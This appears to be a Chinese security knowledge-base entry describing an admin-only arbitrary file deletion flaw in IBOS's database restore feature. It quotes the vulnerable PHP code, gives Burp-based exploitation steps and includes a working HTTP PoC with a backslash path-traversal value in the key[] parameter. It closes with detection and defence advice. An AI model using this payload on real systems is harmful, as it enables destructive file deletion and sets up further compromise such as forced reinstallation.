---
id: web-php-ibos-database-restore-key-unlink-traversal
title: IBOS 后台数据库恢复 key[] 参数拼接备份目录 unlink：只滤正斜杠，Windows 反斜杠穿越任意文件删除
type: scenario
domain: web
path: web/php
technique: ibos-database-restore-key-unlink-traversal
tags:
- php
- ibos
- arbitrary-file-delete
- path-traversal
- unlink
- backup
- admin
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V640
  verified_at: '2026-11-13T02:26:44+08:00'
  notes: 已对照截图核对：actionRestore 遍历 POST key 数组、str_replace 仅去正斜杠后拼接 backupDir 再 unlink、同名 -i 循环分支均与代码一致；图49-51 显示 payload key[]=..\test.txt 删除 data/test.txt，删除前后对比成立；已把 PoC 对齐为原文实际 payload。未验证点：未复跑；Linux 场景未验证（正斜杠被删）；原文未标注 affected_versions；无 sources/source_url。
url: /docs/web/php/web-php-ibos-database-restore-key-unlink-traversal/
draft: false
kb_aliases:
- IBOS 任意文件删除
- DatabaseController actionRestore unlink
- key[] 路径穿越删除
- 数据库恢复删除备份
---

## 一句话结论

IBOS 后台"通用设置 → 数据库 → 恢复"的 `DatabaseController::actionRestore()` 从 POST 参数 `key[]` 取备份文件名，拼接到备份目录后直接 `is_file()` + `unlink()` 删除；路径过滤只 `str_replace('/', '', $fileName)` 去掉正斜杠，未处理 `..` 与 Windows 反斜杠，攻击者可删除备份目录之外、Web 进程有权限的任意文件。

## 原理

- 源码（`system/modules/dashboard/controllers/DatabaseController.php`）：表单提交后遍历 `$_POST['key']`：
  ```php
  foreach ($_POST['key'] as $fileName) {
      $filePath = $backupDir . '/' . str_replace('/', '', $fileName);
      if (is_file($filePath)) {
          @unlink($filePath);
      } else {
          $i = 1;
          while (true) {
              $filePath = $backupDir . '/' . str_replace('/', '', $fileName . '-' . $i);
              if (is_file($filePath)) { @unlink($filePath); $i++; } else { break; }
          }
      }
  }
  ```
- 缺陷：只删除正斜杠 `/`，`..` 完整保留；在 Windows 上反斜杠 `\` 同样是路径分隔符且未被过滤，`..\..\data\test.txt` 可穿越出备份目录。`is_file` 通过后即 `unlink`，没有前缀校验（`realpath` 比较）或白名单。
- 为什么需要后台：该功能在 Dashboard 模块的数据库管理页，需管理员会话；删除动作在"恢复"流程中用于清理备份文件，被做成批量删除。
- 影响：可删除配置文件、安装锁、日志、上传文件等，破坏业务或为后续利用铺路（如删安装锁触发重装）。

## 触发条件

- 已登录 IBOS 后台（数据库恢复页面可访问）。
- POST `key[]` 数组参数可控；Web 进程对目标文件有删除权限。
- 目标为 Windows（反斜杠穿越最直接；Linux 下正斜杠被删除后无法穿越，除非其它编码技巧）。

## 利用步骤

1. 登录后台，进入"通用设置 → 数据库 → 恢复"，页面列出已有备份文件（如 `2023-02-06_0ms4456`）。
2. Burp 抓取删除/恢复请求：`POST /?r=dashboard/database/restore`，body 含 `key[]=<备份文件名>&dbSubmit=1`。
3. 将 `key[]` 改为路径穿越 payload（Windows 反斜杠）。原文实际用 `..` 回退一层删除 `data/test.txt`：
   ```
   key[]=..\test.txt
   ```
   目标层级更浅/更深时按备份目录实际深度调整 `..` 数量；也可针对备份目录内的目标文件直接给名字。
4. 提交后返回 "Database file delete succeed"；访问原文件确认已删除（文章用 `data/test.txt` 做删除前后对比验证）。

## PoC

```http
POST /?r=dashboard/database/restore HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

key[]=..\test.txt&dbSubmit=1
```

说明：原文截图即 `key[]=..\test.txt`（备份目录回退一层到 `data/` 删除 `test.txt`），`..` 数量按备份目录深度调整；反斜杠在表单中可按原样发送（截图为 URL 原始形式）。若目标为 Linux 需另找未过滤分隔符的路径。不访问、不执行原文目标。

## 变体与关联

- 变体：同一 `actionRestore()` 的 else 分支会对 `$fileName-$i` 循环探测删除同名带编号文件，可批量删除 `backup.zip` 系列；把 `key[]` 传多个元素可一次删多个文件。
- 同类审计模式：后台"备份/恢复/编辑器"功能中的 `unlink`、`glob`、`removeDir` 与路径拼接（参见 [[web-php-zentao-backup-editor-arbitrary-file-delete]]）。
- 关联：同产品命令执行见 [[web-php-rce-ibos-database-backup-filename-command-injection]]。

## 检测与防御

- 检测：`dashboard/database/restore` 请求中 `key[]` 出现 `..`、反斜杠、绝对路径特征；备份目录外的文件删除事件（Windows 文件审计）。
- 检测：后台删除操作与文件系统事件关联告警。
- 防御：`key` 只允许匹配备份文件名白名单（正则 `^[0-9A-Za-z_-]+$`），并在删除前用 `realpath()` 校验目标必须位于备份目录内；拒绝包含 `..`、`/`、`\` 的输入。
- 防御：Web 进程最小权限（不可写系统目录）；定期校验关键文件完整性。
